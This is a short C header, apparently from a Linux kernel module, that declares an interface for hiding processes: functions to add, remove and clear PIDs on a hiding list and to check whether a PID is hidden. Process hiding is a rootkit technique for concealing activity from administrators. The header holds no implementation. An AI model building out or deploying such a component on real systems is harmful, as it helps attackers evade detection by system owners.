#ifndef PROCHIDER_H
#define PROCHIDER_H

#include <linux/types.h>

/* initialize proc hider module */
int pidhider_init(void);

/* cleanup proc hider module */
void pidhider_cleanup(void);

/* add pid to hiding list */
void add_to_pid_list(const unsigned short pid);

/* remove pid from hiding list */
void remove_from_pid_list(const unsigned short pid);

/* clear hiding list */
void clear_pid_list(void);

/* check if pid is hidden */
bool is_pid_hidden(const unsigned short pid);

#endif
